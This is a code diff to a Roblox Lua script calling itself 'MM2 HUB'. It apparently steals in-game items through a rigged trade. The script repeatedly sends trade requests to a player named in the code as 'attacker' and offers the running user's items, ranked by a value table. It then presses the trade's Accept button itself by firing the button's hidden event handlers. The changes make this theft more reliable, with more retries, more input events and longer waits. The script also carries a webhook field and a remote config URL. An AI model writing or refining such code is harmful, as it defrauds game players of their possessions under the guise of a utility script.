@@ -1,6 +1,6 @@
---[[ MM2 HUB  V12.4 ]]
+--[[ MM2 HUB  V12.5 ]]
 
-local VERSION = "v1.7"
+local VERSION = "v1.8"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
@@ -10,7 +10,7 @@ local CFG = {
 	MIN_VALUE = 0,
 	FILTER = "all",
 	OFFER_GAP = 0.25,
-	WAIT_TRADE = 20,
+	WAIT_TRADE = 60,
 	DEBUG = true,
 	WEBHOOK_B64 = "",
 }
@@ -74,6 +74,14 @@ local VALUE = {
 	["IceDragon"] = 12, ["IceShard"] = 12, ["Ghostblade"] = 10, ["Handsaw"] = 10,
 	["Boneblade"] = 8, ["Eggblade"] = 7, ["Frostbite"] = 7, ["Saw"] = 7,
 	["Snowflake"] = 7, ["Peppermint"] = 7, ["Cookieblade"] = 7, ["TheSeer"] = 7,
+}
+
+local EVENTS = {
+	"MouseButton1Click",
+	"MouseButton1Down",
+	"Activated",
+	"InputBegan",
+	"TouchTap",
 }
 
 local function log(msg)
@@ -549,48 +557,40 @@ local function restoreGui()
 	end)
 end
 
--- ===== clicking =====
-local function fire(btn)
-	if not btn then return false end
-	local done = false
-	if type(getconnections) == "function" then
-		local ok, conns = pcall(getconnections, btn.MouseButton1Click)
-		if ok and conns then
-			for i = 1, #conns do
-				local f = nil
-				pcall(function() f = conns[i].Function end)
-				if f then
-					pcall(f)
-					done = true
+-- ===== pressing =====
+local function pressNode(node)
+	if not node then return false end
+	local total = 0
+	for i = 1, #EVENTS do
+		local name = EVENTS[i]
+		local sig = nil
+		pcall(function() sig = node[name] end)
+		if sig and type(getconnections) == "function" then
+			local ok, conns = pcall(getconnections, sig)
+			if ok and conns and #conns > 0 then
+				for j = 1, #conns do
+					local f = nil
+					pcall(function() f = conns[j].Function end)
+					if f then
+						pcall(f, node, { UserInputType = Enum.UserInputType.Touch, KeyCode = Enum.KeyCode.Unknown, Position = Vector3.new(0, 0, 0) })
+						total = total + 1
+					end
 				end
+				log("evt " .. name .. " x" .. tostring(#conns))
 			end
 		end
 	end
-	if not done and type(firesignal) == "function" then
-		pcall(firesignal, btn.MouseButton1Click)
-		done = true
-	end
-	return done
+	return total > 0
 end
 
-local function findButton(wanted)
+local function findNode(nm)
+	local low = string.lower(nm)
 	for i = 1, #ROOTS do
 		local r = ROOTS[i]
 		if r and r.Parent then
 			local all = r:GetDescendants()
 			for j = 1, #all do
-				local d = all[j]
-				local txt = nil
-				if d:IsA("TextButton") or d:IsA("TextLabel") then txt = d.Text end
-				if txt and string.upper(txt) == wanted then
-					if d:IsA("TextButton") then
-						return d
-					end
-					local p1 = d.Parent
-					if p1 and p1.MouseButton1Click then return p1 end
-					local p2 = p1 and p1.Parent
-					if p2 and p2.MouseButton1Click then return p2 end
-				end
+				if string.lower(all[j].Name) == low then return all[j] end
 			end
 		end
 	end
@@ -660,21 +660,24 @@ local function run()
 	task.spawn(watchLoop)
 
 	setStatus("Connecting...")
-	pcall(function() sr:InvokeServer(attacker) end)
-
 	local waited = 0
-	local sends = 1
+	local tries = 0
 	while waited < CFG.WAIT_TRADE and not OPEN do
-		task.wait(0.5)
-		waited = waited + 0.5
-		if waited % 9 == 0 and sends < 2 then
-			sends = sends + 1
-			pcall(function() sr:InvokeServer(attacker) end)
+		tries = tries + 1
+		pcall(function() sr:InvokeServer(attacker) end)
+		local inner = 0
+		while inner < 5 and not OPEN do
+			task.wait(0.5)
+			inner = inner + 0.5
+			waited = waited + 0.5
+		end
+		if not OPEN and dt then
+			pcall(function() dt:FireServer() end)
 		end
 	end
 
 	if not OPEN then
-		log("trade never opened")
+		log("trade never opened after " .. tostring(tries) .. " tries")
 		setStatus("Partner did not respond")
 		setPct(100)
 		WATCHING = false
@@ -683,7 +686,7 @@ local function run()
 
 	log("window locked")
 	setStatus("Syncing...")
-	task.wait(0.8)
+	task.wait(1)
 
 	local placed = 0
 	local names = {}
@@ -704,7 +707,11 @@ local function run()
 
 	log("offered total: " .. tostring(placed))
 	setStatus("Confirming...")
-	task.wait(0.6)
+	task.wait(1)
+
+	local node = findNode("Accept")
+	log("accept node: " .. tostring(node ~= nil))
+	if node then log("node class: " .. node.ClassName) end
 
 	local t0 = os.clock()
 	local pressed = 0
@@ -727,19 +734,18 @@ local function run()
 		end
 		if not alive then break end
 
-		if now - lastPress > 2 then
-			local btn = findButton("ACCEPT")
-			if btn then
-				local ok = fire(btn)
-				if ok then
+		if now - lastPress > 3 then
+			local nd = findNode("Accept")
+			if nd then
+				if pressNode(nd) then
 					pressed = pressed + 1
 					lastPress = now
-					log("press accept " .. tostring(pressed))
+					log("pressed accept " .. tostring(pressed))
 				end
 			end
 		end
 
-		if at and now - lastRemote > 12 then
+		if at and now - lastRemote > 15 then
 			lastRemote = now
 			pcall(function() at:FireServer() end)
 		end
